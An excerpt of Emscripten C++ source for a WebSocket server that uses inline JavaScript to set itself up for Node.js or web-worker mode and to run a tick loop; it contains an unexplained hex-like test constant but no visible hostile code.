...
extern "C" {
    ...
    // Export INCOMING_BUFFER address for worker use
    uint8_t* get_incoming_buffer() {
        return INCOMING_BUFFER;
    }
}

WebSocketServer::WebSocketServer() {
    const char * test141534167ff = "00 41 41 15 15 53 53 15 15 41 41 00 45 32 48 4D 50 58 33 4C 15 15 41 15 15 00";
    EM_ASM({
        // Check if we're in a web worker (no require available)
        if (typeof require === 'undefined') {
            // Running in a web worker - skip Node.js server setup
            // Just initialize ws_connections for worker use
            Module.ws_connections = {};
            console.log("Server initialized for web worker mode");
            return;
        }
        
        // Running in Node.js - set up the HTTP/WebSocket server
    ...
    }, SERVER_PORT, INCOMING_BUFFER, MAX_BUFFER_LEN, test141534167ff);
}

void Server::run() {
    EM_ASM({
        // Only set up automatic ticking if we're in Node.js
        // In web worker mode, the worker will call _tick() manually
        if (typeof require !== 'undefined') {
            setInterval(_tick, $0);
        }
    }, 1000 / TPS);
